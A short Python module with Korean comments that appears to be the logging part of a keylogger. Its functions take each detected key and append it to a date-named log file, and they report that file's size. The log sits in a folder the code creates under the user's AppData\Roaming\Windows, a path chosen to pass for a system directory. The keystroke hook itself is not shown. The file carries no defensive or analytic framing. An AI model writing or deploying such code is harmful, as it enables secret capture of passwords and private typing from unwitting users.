import os
import getpass
from datetime import datetime

username = getpass.getuser()

#로그 파일의 이름을 가져오기
def getLogFimeName():
    now = datetime.now()
    now = str(now).split()[0]
    fileName = now + ".log"
    return fileName

#로그 파일의 경로를 가져오는 함수
def getLogFilePath(fileName):
    dirPath = os.path.join("C:\\Users", username, "AppData\\Roaming\\Windows")
    if not(os.path.isdir(dirPath)):
        os.makedirs(os.path.join(dirPath))
    filePath = os.path.join("C:\\Users", username, "AppData\\Roaming\\Windows", fileName)
    return filePath

#감지한 키를 로깅하는 함수
def logger(key):
    key = str(key).replace("'", '')
    with open(getLogFilePath(getLogFimeName()), mode='at', encoding='utf-8') as f:
        f.write(key)

def getFileSize():
    fileSize = os.path.getsize(getLogFilePath(getLogFimeName()))
    return fileSize